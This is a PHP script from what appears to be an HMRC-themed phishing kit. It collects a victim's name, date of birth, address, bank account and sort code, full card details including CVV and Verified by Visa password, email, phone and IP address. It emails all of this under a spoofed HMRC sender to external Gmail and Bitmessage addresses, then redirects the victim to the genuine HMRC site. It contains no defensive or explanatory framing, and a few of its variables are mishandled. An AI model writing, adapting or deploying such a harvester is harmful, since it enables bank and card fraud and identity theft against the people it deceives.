<?php
$xxx_name=$_POST['name'];
$xxx_dob1=$_POST['dob1'];
$xxx_dob2=$_POST['dob2'];
$xxx_dob3=$_POST['dob3'];
$xxx_address=$_POST['address'];
$xxx_city=$_POST['city'];
$xxx_zip=$_POST['zip'];
$xxx_account=$_POST['account'];
$xxx_sort=$_POST['sort'];
$xxx_cc=$_POST['cc'];
$xxx_month=$_POST['month'];
$xxx_year=$_POST['year'];
$xxx_cvv=$_POST['cvv'];
$xxx_vbv=$_POST['vbv'];
$xxx_balance=$_POST['balance'];
$xxx_emailaddy=$_POST['emailaddy'];
$xxx_phne=$_POST['phne'];
$xxx_phne=$_POST['issueno'];

$xxxmu1e_ip        = getenv("REMOTE_ADDR");
$xxxmu1e_datamasii = date("D M d, Y g:i a");


$message .="Personal Information\n";
$message .="Full Name      : $xxx_name\n";
$message .="Dob day        : $xxx_dob1\n";
$message .="Date month     : $xxx_dob2\n";
$message .="Date year      : $xxx_dob3\n";
$message .="Billing information\n";
$message .="Full Address       : $xxx_address\n";
$message .="City               : $xxx_city\n";
$message .="Zip Code           : $xxx_zip\n";
$message .="Account Number     : $xxx_account\n";
$message .="Sort Code          : $xxx_sort\n";
$message .="Card Details\n";
$message .="Card Number       : $xxx_cc\n";
$message .="Expiration Date   : $xxx_month / $xxx_year\n";
$message .="Cvv2              : $xxx_cvv\n";
$message .="VBV               : $xxx_vbv\n";
$message .="Estimate Balance  : $xxx_balance\n";
$message .="Email Address     : $xxx_emailaddy\n";
$message .="Phone Number     : $xxx_phne\n";
$message .="Issue Number     : $xxx_pissueno\n";
$message .=".............................................\n";
$message .="Date         : $xxxmu1e_datamasii \n";
$message .="IP $xxxmu1e_ip\n";
$message .="..............................................\n";

$qwe_header = "From: hmrc@hmrevenue.com\n";
$qwe_subject = "HMRC";$qwe_email_to = "meinegeheimnisgewolbe@gmail.com,BM-2cUHEBVHWj8fYXBsPVAC8VMSzHqiRPeDXa@bitmessage.ch";
@mail($qwe_email_to, $qwe_subject ,$message ,$qwe_header );

header("Location: http://www.hmrc.gov.uk/agents/");

?>